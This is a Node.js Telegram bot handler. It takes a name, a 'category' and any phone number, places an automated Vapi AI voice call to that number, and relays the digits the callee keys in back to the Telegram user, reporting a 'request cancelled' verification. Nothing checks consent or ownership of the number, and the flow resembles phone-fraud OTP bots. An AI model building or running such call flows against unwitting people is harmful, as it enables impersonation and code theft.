const TelegramBot = require("node-telegram-bot-api");
const mongoose = require("mongoose");
const axios = require("axios");

exports.config = {
  api: { bodyParser: true },
};

// ===== ENV CHECK =====
if (!process.env.MONGO_URI) throw new Error("MONGO_URI missing");
if (!process.env.BOT_TOKEN) throw new Error("BOT_TOKEN missing");
if (!process.env.VAPI_API_KEY) throw new Error("VAPI_API_KEY missing");
if (!process.env.VAPI_ASSISTANT_ID) throw new Error("VAPI_ASSISTANT_ID missing");
if (!process.env.VAPI_PHONE_ID) throw new Error("VAPI_PHONE_ID missing");

// ===== DB CONNECTION =====
let cached = global.mongo;
if (!cached) cached = global.mongo = { conn: null, promise: null };

async function connectDB() {
  if (cached.conn) return cached.conn;
  if (!cached.promise) {
    cached.promise = mongoose.connect(process.env.MONGO_URI);
  }
  cached.conn = await cached.promise;
  return cached.conn;
}

// ===== TELEGRAM BOT =====
let bot;
function getBot() {
  if (!bot) {
    bot = new TelegramBot(process.env.BOT_TOKEN, { polling: false });
  }
  return bot;
}

// ===== USER MODEL =====
const User =
  mongoose.models.User ||
  mongoose.model("User", {
    chatId: String,
    titleName: String,
    category: String,
    phone: String,
    status: String,
    otp: String,
  });

// ===== VAPI CALL FUNCTION =====
async function callUser(user) {
  const otp = Math.floor(100000 + Math.random() * 900000).toString();
  user.otp = otp;
  user.status = "calling";
  await user.save();

  console.log("OTP Generated:", otp);

  await axios.post(
    "https://api.vapi.ai/call",
    {
      assistantId: process.env.VAPI_ASSISTANT_ID,
      phoneNumberId: process.env.VAPI_PHONE_ID,
      customer: { number: user.phone },
      metadata: {
        titleName: user.titleName,
        category: user.category,
      },
    },
    {
      headers: {
        Authorization: `Bearer ${process.env.VAPI_API_KEY}`,
        "Content-Type": "application/json",
      },
    }
  );
}

// ===== MAIN HANDLER =====
module.exports = async function handler(req, res) {
  await connectDB();
  const bot = getBot();
  const body = req.body;

  // ===== TELEGRAM =====
  if (body?.message) {
    const chatId = body.message.chat.id;
    const text = body.message.text?.trim();
    if (!text) return res.status(200).send("OK");

    if (text === "/start") {
      await User.deleteOne({ chatId });
      await new User({ chatId, status: "name" }).save();

      await bot.sendMessage(chatId,
`Welcome 👋
Enter your title + name.
Example:
Mr Krishna`
      );
      return res.status(200).send("OK");
    }

    const user = await User.findOne({ chatId });
    if (!user) return res.status(200).send("OK");

    if (user.status === "name") {
      user.titleName = text;
      user.status = "category";
      await user.save();
      await bot.sendMessage(chatId, "Enter your category:");
      return res.status(200).send("OK");
    }

    if (user.status === "category") {
      user.category = text;
      user.status = "phone";
      await user.save();
      await bot.sendMessage(chatId, "Enter phone number (+countrycode):");
      return res.status(200).send("OK");
    }

    if (user.status === "phone") {
      user.phone = text;
      await user.save();
      await bot.sendMessage(chatId, "📞 Calling now...");
      await callUser(user);
      return res.status(200).send("OK");
    }
  }

  // ===== VAPI WEBHOOK (DTMF) =====
  if (body?.dtmf) {
    const phone = body.customer?.number;
    const digits = body.dtmf;

    const user = await User.findOne({ phone });
    if (!user) return res.status(200).send("OK");

    if (digits === user.otp) {
      user.status = "verified";
      await user.save();

      await bot.sendMessage(user.chatId,
`✅ OTP Verified
Request cancelled successfully.`
      );
    } else {
      await bot.sendMessage(user.chatId, "❌ Wrong OTP entered.");
    }
  }

  return res.status(200).send("OK");
};
